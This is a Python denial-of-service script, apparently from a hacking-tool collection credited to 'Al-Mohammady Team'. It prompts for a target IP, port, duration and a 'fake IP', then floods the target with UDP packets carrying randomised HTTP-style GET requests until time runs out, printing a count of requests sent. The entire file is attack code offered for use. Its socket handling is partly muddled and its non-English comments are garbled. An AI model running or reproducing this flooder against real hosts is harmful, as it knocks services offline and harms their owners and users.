import socket
import random
import time
from colorama import Fore
import threading
import sys, os
from Tools.logo import logo
from halo import Halo
__version__ = '8.0'
__author__ = "Al-Mohammady Team."
__method__ = 'UDP'

def userAgent():
    global uagent
    with open('Tools/user_agent.txt', 'r') as ug:
        uagent = [line.strip() for line in ug.readlines()]
    return uagent

uagent = userAgent()

attack_num = 0

def dos1():
    global sent
    sent = 0
    try:
        while time.time() < end_time:
            sent += 1
            packet = f"GET /?{random.randint(1000000, 1000000000)} HTTP/1.1\nHost: {host}\nUser-Agent: {random.choice(uagent)}\n\n"
            packet = packet.encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((fake_ip, int(port)))  # Ø§ÙØ§ØªØµØ§Ù Ø¨Ø§ÙÙØ¯Ù Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù fake_ip

            if s.sendto(packet, (host, int(port))):
                s.close()
                print(f'{Fore.GREEN}[ {sent} ] {Fore.YELLOW}Sent Request! Size: {Fore.GREEN}{len(packet)}.')
            else:
                s.close()
                print("\033[91mshut<->down\033[0m")
            time.sleep(.0)
    except socket.error as e:
        print("\033[91mno connection! server maybe down\033[0m")
        print(f"\033[91mSocket error: {e}\033[0m")
        time.sleep(.0)

    print(f"{Fore.MAGENTA}[ ! ]{Fore.RED} The attack is complete.")
    print(f"{Fore.MAGENTA}[ % ] {Fore.WHITE}Request Sent : {Fore.MAGENTA}{sent}.")
    sys.exit(1)

# --------
def usage():
    spinner = Halo()
    spinner.succeed(f'Method : {__method__}.')
    spinner.stop()
    print('-'*40)
    
usage()

host = input(f"{Fore.GREEN}[ ? ]{Fore.YELLOW} IP Target  : ")
port = int(input(f"{Fore.GREEN}[ ? ] {Fore.YELLOW}Port       : "))
attack_time = int(input(f"{Fore.GREEN}[ ? ] {Fore.YELLOW}Time       : "))
delay_time = int(input(f"{Fore.GREEN}[ ? ] {Fore.YELLOW}Delay time : "))
fake_ip = input(f"{Fore.GREEN}[ ? ] {Fore.YELLOW}Fake IP    : ")  # Ø§Ø³ØªØ®Ø¯Ø§Ù fake_ip ÙÙØ§ØªØµØ§Ù Ø¨Ø§ÙÙØ¯Ù

end_time = time.time() + attack_time

threading.Thread(target=dos1).start()
